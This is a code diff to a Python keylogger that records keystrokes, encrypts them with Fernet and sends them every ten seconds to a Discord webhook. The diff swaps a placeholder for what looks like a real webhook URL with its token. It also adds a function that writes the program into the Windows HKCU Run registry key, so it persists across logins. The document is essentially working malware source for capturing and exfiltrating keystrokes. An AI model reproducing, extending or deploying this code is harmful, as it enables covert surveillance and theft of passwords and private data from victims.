@@ -4,6 +4,8 @@ from dhooks import Webhook
 from threading import Timer
 import logging
 import os
+import winreg
+import sys
 
 #generate fernet key
 key = Fernet.generate_key()
@@ -37,7 +39,7 @@ char_count = 0
 keys = []
 
 # constants for the periodic log sending and webhook url
-WEBHOOK_URL = "token here hahaa"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1115908469330026526/gSpmYbCUZiL1N9KvMm_j5garlQPiUcdZYnkhERWMVLFoYIRX9tpZpes_M7ph5OinrtoB"
 TIME_INTERVAL = 10
 
 # inputting the webhook url
@@ -104,7 +106,29 @@ def report():
 
     Timer(TIME_INTERVAL, lambda: report()).start()
 
+def add_to_startup():
+    # Get the path to the executable
+    executable_path = sys.executable
+    # Get the name of the program without the file extension
+    program_name = os.path.splitext(os.path.basename(executable_path))[0]
+
+    # Open the "Run" registry key
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    # Set the program path as the registry value
+    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, executable_path)
+
+    # Close the registry key
+    winreg.CloseKey(key)
+    
+
 def run():
+    add_to_startup()
     report()
     with Listener(on_press=on_press, on_release=on_key_release) as listener:
         listener.join()
